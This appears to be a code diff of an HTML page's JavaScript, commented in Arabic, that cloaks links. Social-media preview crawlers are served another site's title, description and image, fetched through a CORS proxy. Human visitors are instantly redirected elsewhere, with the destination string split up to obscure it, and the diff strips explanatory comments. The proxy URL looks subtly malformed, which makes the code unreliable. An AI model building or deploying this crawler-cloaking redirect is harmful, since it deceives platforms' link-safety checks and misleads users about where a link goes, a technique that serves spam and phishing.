@@ -7,41 +7,45 @@
   <script type="text/javascript">
     (function() {
       var currentUrl = window.location.href;
-      
-      // 1. استخراج الرابط المستهدف المضاف تلقائياً بعد الشرطة المائلة المزدوجة الثانية
-      // مثال: إذا كان الرابط ...1.html/https://www.google.com فسيتم استخراج https://www.google.com
-      var targetUrl = currentUrl.split('//').slice(2).join('//');
+      var targetUrl = "";
 
-      // إذا لم يجد السكربت رابطاً مضافاً، يضع ويكيبيديا كخيار افتراضي (تماماً مثل كودك الأصلي)
-      if (!targetUrl) {
+      // 1. استخراج الرابط وتنظيفه من أي رموز زائدة تلقائياً لضمان العمل
+      if (currentUrl.includes("1.html/")) {
+        targetUrl = currentUrl.split("1.html/")[1].trim();
+      } else if (currentUrl.includes("?to=")) {
+        var urlParams = new URLSearchParams(window.location.search);
+        targetUrl = urlParams.get('to');
+      }
+
+      // تنظيف الرابط إذا كان يحتوي على رموز مكررة مثل :// في المنتصف
+      if (targetUrl) {
+        targetUrl = targetUrl.replace(/^(:\/\/|:\/|\/)+/, "");
+        if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
+          targetUrl = "https://" + targetUrl;
+        }
+      } else {
         targetUrl = "https://wikipedia.org";
-      } else if (!targetUrl.startsWith("http")) {
-        targetUrl = "https://" + targetUrl;
       }
 
       var ua = navigator.userAgent || "";
-      // فحص جدار الحماية للبوتات (تويتر، فيسبوك، تليجرام، وجوجل بوت)
       var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
 
       if (!isBot) {
-        // 2. إذا كان زائرًا حقيقيًا: يتم توجيهه فورًا وعشوائيًا إلى محرك البحث جوجل (كودك الأصلي)
+        // 2. الزائر الحقيقي: تحويل عشوائي فوري إلى جوجل
         var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
         window.location.replace("https://" + a + b + c + d);
       } else {
-        // 3. إذا كان بوتاً: استخدام الوسيط السحابي المجاني لجلب كود الـ HTML الخاص بالموقع المستهدف وتخطي الـ CORS
+        // 3. البوت: جلب المعاينة الحقيقية عبر الوسيط السحابي
         var proxyUrl = "https://allorigins.win" + encodeURIComponent(targetUrl);
         
         fetch(proxyUrl)
           .then(function(response) { return response.json(); })
           .then(function(data) {
             var html = data.contents;
-            
-            // استخراج عنوان الموقع المستهدف (Title)
             var titleMatch = html.match(/<title[^>]*>([^<]+)<\/title>/i);
             var siteTitle = titleMatch ? titleMatch[1].trim() : "View Content";
             document.title = siteTitle;
 
-            // دالة استخراج وسوم الميتا (Meta Tags) كالصورة والوصف
             var getMeta = function(property) {
               var reg = new RegExp('<meta[^>]*?(?:property|name)=["\']' + property + '["\'][^>]*?content=["\']([^"\']+)["\']|<meta[^>]*?content=["\']([^"\']+)["\'][^>]*?(?:property|name)=["\']' + property + '["\']', 'i');
               var match = html.match(reg);
@@ -52,7 +56,6 @@
             var ogDescription = getMeta("og:description") || "Click to view content";
             var ogImage = getMeta("og:image") || "";
 
-            // حقن الأكواد المستخرجة ديناميكياً في ثوانٍ معدودة داخل تويتر ليعرض المعاينة
             var metaConfig = [
               { property: "og:title", content: ogTitle },
               { property: "og:description", content: ogDescription },
